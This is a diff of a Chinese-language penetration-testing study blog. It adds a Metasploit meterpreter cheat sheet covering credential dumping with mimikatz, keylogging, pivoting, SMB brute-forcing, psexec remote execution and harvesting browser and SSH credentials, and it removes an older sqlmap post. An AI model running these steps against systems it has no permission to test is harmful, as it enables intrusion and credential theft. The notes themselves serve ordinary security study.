@@ -152,6 +152,170 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/22/msf%E4%B9%8Bmeterpreter/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="nannanshen">
+      <meta itemprop="description" content="渗透测试">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/22/msf%E4%B9%8Bmeterpreter/" class="post-title-link" itemprop="url">msf之meterpreter</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-22 09:58:36" itemprop="dateCreated datePublished" datetime="2020-03-22T09:58:36+08:00">2020-03-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-25 18:15:38" itemprop="dateModified" datetime="2020-03-25T18:15:38+08:00">2020-03-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="明文密码和HASH获取"><a href="#明文密码和HASH获取" class="headerlink" title="明文密码和HASH获取"></a>明文密码和HASH获取</h1><ul>
+<li>绕过UAC之后，如果目标已经登录过，没有关机或者没有重启后没有用户登录的话，是可以直接从内存里面获取到机器的明文密码。</li>
+</ul>
+<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><ul>
+<li>绕过UAC，反弹获得meterpreter以后，首先执行hashdump。</li>
+<li>加载模块，load mimikatz</li>
+<li>执行wdigest，获取明文密码。如果不行，尝试执行kerberos或者msv命令</li>
+</ul>
+<h1 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h1><h2 id="手动迁移"><a href="#手动迁移" class="headerlink" title="手动迁移"></a>手动迁移</h2><ul>
+<li>监听的时候 set exitonsession false，exploit -j -z，反弹的时候就不会退出监听。</li>
+<li>sessions查看会话，sessions+id打开会话。</li>
+<li>使用ps命令列出所有进程，getpid查看当前exp进程pid，一般进程都选择迁移到任务管理器进程。</li>
+<li>执行migrate -N explorer.exe。或migrate -P pid。  迁移完成后原进程会自动退出。高权限可以往低权限迁移，低权限不能往高权限迁。</li>
+</ul>
+<h2 id="上线自动迁移"><a href="#上线自动迁移" class="headerlink" title="上线自动迁移"></a>上线自动迁移</h2><ul>
+<li>执行exploit之前设置 set autorunscript migrate - n explorer.exe</li>
+<li>或者执行set AutoRunScript migrate -f，msf会自动选择一个进程进行迁移</li>
+</ul>
+<h1 id="各类操作"><a href="#各类操作" class="headerlink" title="各类操作"></a>各类操作</h1><h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><ul>
+<li>keyscan_start</li>
+<li>keyscan_dump</li>
+<li>keyboard_send 对目标机器进行键盘输入</li>
+</ul>
+<h2 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h2><ul>
+<li>screenshot</li>
+</ul>
+<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><ul>
+<li>上传：upload /root/xf.php c:\xf.php</li>
+<li>下载： download c:/xf.php /root/1.php</li>
+<li>cat 文件名 查看文件</li>
+<li>edit c:/xf.php 编辑文件</li>
+<li>cd c: / 切换工作目录</li>
+</ul>
+<h2 id="加载语言终端"><a href="#加载语言终端" class="headerlink" title="加载语言终端"></a>加载语言终端</h2><ul>
+<li>load -l 列出能加载的语言终端</li>
+<li>load powershell。加载</li>
+<li>具体操作在官网看看。</li>
+</ul>
+<h1 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h1><p>##获取网段</p>
+<ul>
+<li>shell  –&gt;  ipconfig</li>
+<li>run get_local_subnets</li>
+<li>route list</li>
+</ul>
+<h2 id="添加路由-1"><a href="#添加路由-1" class="headerlink" title="添加路由"></a>添加路由</h2><p>把自己的机器添加进目标主机路由才能对内网进行操作</p>
+<ul>
+<li>run autoroute -s 192.168.0.0</li>
+<li>backgroup –&gt; route add 192.168.0.0 255.255.255.0 1</li>
+<li>arp扫描 run arp_scanner -r 192.168.0.0/24</li>
+</ul>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><ul>
+<li>search portscan</li>
+<li>use auxiliary/scanner/portscan/syn  （use 5）</li>
+<li>setg rhost 192.168.0.0/24 (setg设置全局参数)</li>
+<li>set threads 20 </li>
+<li>set rhost Interrupt: use the quit</li>
+<li>set ports 445 </li>
+<li>exploit</li>
+</ul>
+<h1 id="SMB密码爆破"><a href="#SMB密码爆破" class="headerlink" title="SMB密码爆破"></a>SMB密码爆破</h1><ul>
+<li>首先扫描开放了445端口的主机</li>
+<li>use auxiliary/scanner/smb/smb_login</li>
+<li>set smbuser administrator   (set USER_FILE /root/user.dic)</li>
+<li>set smbpass admin  (set USERPASS_FILE /root/pass.dic)</li>
+<li>set rhosts file:/root/host.dic</li>
+<li>exploit</li>
+</ul>
+<h1 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h1><ul>
+<li>search psxec</li>
+<li>use auxiliary/admin/smb/psexec_command</li>
+<li>set command whoami</li>
+<li>set rhosts 192.168.0.19</li>
+<li>set smbuser administrator</li>
+<li>set smbpass admin</li>
+<li>exploit</li>
+</ul>
+<h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><ul>
+<li><p>一般应用在无法直接连接某个端口的情况下</p>
+</li>
+<li><p>portfwd add -l 6666 -p 3389 -r 127.0.0.1(也可换成内网其他主机ip)</p>
+<p>将目标机器的3389端口转发到装了msf的vps的6666端口上</p>
+</li>
+<li><p>转发完之后删除  add改成delete</p>
+</li>
+</ul>
+<h1 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h1><ul>
+<li>不支持ICMP和ARP协议。</li>
+<li>socks5比socks4a支持的协议更多</li>
+</ul>
+<h2 id="具体操作-1"><a href="#具体操作-1" class="headerlink" title="具体操作"></a>具体操作</h2><ul>
+<li>首先添加路由关联到session上</li>
+<li>search socks</li>
+<li>use auxiliary/server/socks4a</li>
+<li>set STVHOST 127.0.0.1</li>
+<li>set SRVPOST  10808</li>
+<li>exploit</li>
+<li>架设完socks代理以后，使用代理需要结合proxychains</li>
+<li>打开proxychains配置文件把端口改成刚才设置的</li>
+<li>proxychains nmap -Pn -sT 192.168.0.19</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/06/SRC%E5%AE%9E%E6%88%98/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -183,7 +347,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-03-21 11:14:20" itemprop="dateModified" datetime="2020-03-21T11:14:20+08:00">2020-03-21</time>
+                <time title="修改时间：2020-03-22 09:21:58" itemprop="dateModified" datetime="2020-03-22T09:21:58+08:00">2020-03-22</time>
               </span>
 
           
@@ -259,9 +423,17 @@
 <li><p>目录扫描(御剑，dirbuster，burp)</p>
 </li>
 <li><p>wfuzz</p>
-<figure class="highlight plain"><figcaption><span>-w</span><a href="/root/FuzzDicts/directoryDicts/en_dirctories_all.txt">-w /root/FuzzDicts/directoryDicts/php/phpFileName.txt http://192.168.0.102/wordpress/FUZZ/FUZ2Z```</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">过滤参数：</span><br><span class="line"></span><br><span class="line">--hc(code)</span><br><span class="line">--hl(line)</span><br><span class="line">--hw(word)</span><br><span class="line">--hh(char)</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;wfuzz -w wordlist --hc 404 URL&#x2F;FUZZ</span><br></pre></td></tr></table></figure>
-
-<p><code>wfuzz -w wordlist --hs &quot;Not Found&quot; URL/FUZZ</code></p>
+<ul>
+<li><code>wfuzz -w /root/FuzzDicts/directoryDicts/en_dirctories_all.txt -w /root/FuzzDicts/directoryDicts/php/phpFileName.txt http://192.168.0.102/wordpress/FUZZ/FUZ2Z</code></li>
+</ul>
+<p>过滤参数：</p>
+<p>–hc(code)<br>–hl(line)<br>–hw(word)<br>–hh(char)</p>
+<ul>
+<li><p><code>wfuzz -w wordlist --hc 404 URL/FUZZ</code></p>
+</li>
+<li><p><code>wfuzz -w wordlist --hs &quot;Not Found&quot; URL/FUZZ</code></p>
+</li>
+</ul>
 </li>
 <li><p>在JS文件中寻找敏感接口</p>
 <p><a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a></p>
@@ -667,10 +839,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-02-27 13:50:48 / 修改时间：15:02:29" itemprop="dateCreated datePublished" datetime="2020-02-27T13:50:48+08:00">2020-02-27</time>
+              <time title="创建时间：2020-02-27 13:50:48" itemprop="dateCreated datePublished" datetime="2020-02-27T13:50:48+08:00">2020-02-27</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-22 11:34:04" itemprop="dateModified" datetime="2020-03-22T11:34:04+08:00">2020-03-22</time>
+              </span>
 
           
 
@@ -766,7 +944,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-27 13:49:15" itemprop="dateModified" datetime="2020-02-27T13:49:15+08:00">2020-02-27</time>
+                <time title="修改时间：2020-03-25 18:10:24" itemprop="dateModified" datetime="2020-03-25T18:10:24+08:00">2020-03-25</time>
               </span>
 
           
@@ -885,7 +1063,8 @@
 </ul>
 </li>
 <li><p>post</p>
-<p>后渗透模块。一般用于内网渗透。</p>
+<p>后渗透模块。一般用于内网渗透。在meterpreter里面就可以使用</p>
+<p>run post/windows/gather/hashdump 获取密码hash，权限不够可以通过提权以后进行进程迁移。<br>run post/windows/gather/smart_hashdump<br>run post/multi/recon/local_exploit_suggester  提权<br>run post/multi/gather/firefox_creds<br>run post/multi/gather/ssh_creds<br>run post/windows/gather/enum_applications</p>
 </li>
 <li><p>encoders</p>
 <p>编码器模块。对payload进行编码加密，绕过杀软。</p>
@@ -897,6 +1076,30 @@
 <p>空指令模块。用以产生缓冲区填充的非操作性指令。</p>
 </li>
 </ol>
+<h1 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h1><h2 id="安装postgresql"><a href="#安装postgresql" class="headerlink" title="安装postgresql"></a>安装postgresql</h2><ul>
+<li>apt-get install postgresql -y</li>
+</ul>
+<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul>
+<li><p>修改postgres系统用户密码</p>
+<p>echo “postgres:password” | chpasswd</p>
+</li>
+<li><p>修改数据库默认用户postgres密码</p>
+<p>su postgres</p>
+<p>psql</p>
+<p>\password postgres</p>
+<p>\q</p>
+<p>exit</p>
+</li>
+<li><p>进入msfconsole后连接</p>
+<p>db_connect postgres:<a href="mailto:password@127.0.0.1">password@127.0.0.1</a>/msfdb</p>
+</li>
+<li><p>creds命令查看记录</p>
+</li>
+</ul>
+<h2 id="快捷连接"><a href="#快捷连接" class="headerlink" title="快捷连接"></a>快捷连接</h2><ul>
+<li>把 db_connect postgres:<a href="mailto:password@127.0.0.1">password@127.0.0.1</a>/msfdb 保存为文件connection.rc</li>
+<li>msfconsole -r connection.rc</li>
+</ul>
 
       
     </div>
@@ -1628,107 +1831,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/20/sql%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/touxiang.jpg">
-      <meta itemprop="name" content="nannanshen">
-      <meta itemprop="description" content="渗透测试">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="学习笔记">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/02/20/sql%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">sql注入工具sqlmap的使用</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-02-20 10:43:00 / 修改时间：15:56:27" itemprop="dateCreated datePublished" datetime="2020-02-20T10:43:00+08:00">2020-02-20</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="注入Access"><a href="#注入Access" class="headerlink" title="注入Access"></a>注入Access</h1><ul>
-<li>一般小型网站使用asp+Access</li>
-<li>Access的特性，没办法直接获取表名列名，只能通过暴力猜解。一般使用sqlmap自带的就行。</li>
-<li>一个小技巧，在网站后台页面查看登录框源码可能会有字段名出现。</li>
-</ul>
-<h2 id="一般流程"><a href="#一般流程" class="headerlink" title="一般流程"></a>一般流程</h2><ul>
-<li>-u 检测注入，–dbs 爆数据库，–curren-db 获取当前数据库，–tables 爆表名，–columns 爆列名，–dump爆数据，–start  1 –stop 2 指定第一条到第二条数据，测试一两条数据，挖src的时候不容易出事。</li>
-<li>拿到密码解密后可以登录后台，无后台可以用这个密码尝试登录远程桌面或者ftp服务</li>
-</ul>
-<h1 id="注入mysql"><a href="#注入mysql" class="headerlink" title="注入mysql"></a>注入mysql</h1><ul>
-<li>基础用法同上</li>
-</ul>
-<h1 id="sqlmap参数"><a href="#sqlmap参数" class="headerlink" title="sqlmap参数"></a>sqlmap参数</h1><ul>
-<li>-r参数，从一个文件里获取一个HTTP请求，这样就不需要对cookie等请求头参数进行设置。sqlmap会自己对这些参数进行测试  。sqlmap -r 文件物理路径</li>
-<li>-m参数，从文件里一条一条获取url，一个一个进行检测。也就是批量检测</li>
-<li>–cookie参数，有时候登录以后的注入要带上cookie才能检测。</li>
-<li>–radom-agent参数，随机更改user-agent，防止被识别出来。</li>
-<li>–proxy参数，使用代理，不使用真实ip，可以翻墙，也可以隐藏身份。</li>
-<li>–delay参数，设置两次请求之间的延时。防止请求速度过快被封。–delay 1</li>
-<li>–tamper参数，指定绕过脚本，对注入语句进行变形以达到绕过waf的目的。</li>
-<li>–technique参数，指定注入技术，B布尔，E报错，U联合，S堆叠，T时间。</li>
-<li>–risk参数，提高测试等级，最高为3。会增加测试语句。</li>
-<li>–lever参数，增加被测试的语句。</li>
-<li>–string参数，在正常的页面找一个错误页面没有的字符串，添加到参数后面帮助识别注入。注：在填写搜索关键词的时候，一定要找出那些能够搜索出内容的关键词，比如你在实战中搜索dark5，但是网站没有关于dark5的文章内容，就不会出现正常的搜索结果，这样我们把注入语句加在dark5的后面时，是没有办法判断我们的SQL语句是否成功执行，就没有办法达到我们想要的结果了。还有的网站使用ajax，有时候真正的请求会在后面，需要通过抓包来判断</li>
-<li>*，这个参数用来指定测试语句位置，通常用于伪静态页面，也可用于正常页面增加效率。文章：<a href="https://www.cnblogs.com/ximotao/p/5870274.html" target="_blank" rel="noopener">https://www.cnblogs.com/ximotao/p/5870274.html</a></li>
-</ul>
-<h2 id="sqlmap进行oob注入"><a href="#sqlmap进行oob注入" class="headerlink" title="sqlmap进行oob注入"></a>sqlmap进行oob注入</h2><ul>
-<li>看看大佬写的过程  <a href="https://github.com/52stu/Notes_pub/blob/master/DNSlog%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%89%8B%E5%86%8C.md#sqlmap%E9%85%8D%E5%90%88dnslog" target="_blank" rel="noopener">https://github.com/52stu/Notes_pub/blob/master/DNSlog%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%89%8B%E5%86%8C.md#sqlmap%E9%85%8D%E5%90%88dnslog</a></li>
-</ul>
-<h2 id="注入伪静态"><a href="#注入伪静态" class="headerlink" title="注入伪静态"></a>注入伪静态</h2><ul>
-<li>用sqlmap在注入点处加个*即可</li>
-</ul>
-<h2 id="sqlmap处理高权限MSSQL注入"><a href="#sqlmap处理高权限MSSQL注入" class="headerlink" title="sqlmap处理高权限MSSQL注入"></a>sqlmap处理高权限MSSQL注入</h2><ul>
-<li>–curren-user 查看当前用户</li>
-<li>– is-dba 查看当前用户是否是数据库管理员权限用户</li>
-<li>–os-shell 使用存储过程，执行系统命令 </li>
-<li>–sql-shell 权限不够大时可以执行一些数据库命令</li>
-<li>–os-pwn –msf-path  /…/metasploit  配合msf</li>
-</ul>
-<h2 id="sqlmap处理高权限MYSQL注入"><a href="#sqlmap处理高权限MYSQL注入" class="headerlink" title="sqlmap处理高权限MYSQL注入"></a>sqlmap处理高权限MYSQL注入</h2><ul>
-<li>能爆出物理路径，基本流程同上</li>
-<li>没爆出路径只能自己爆破了</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1801,14 +1903,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
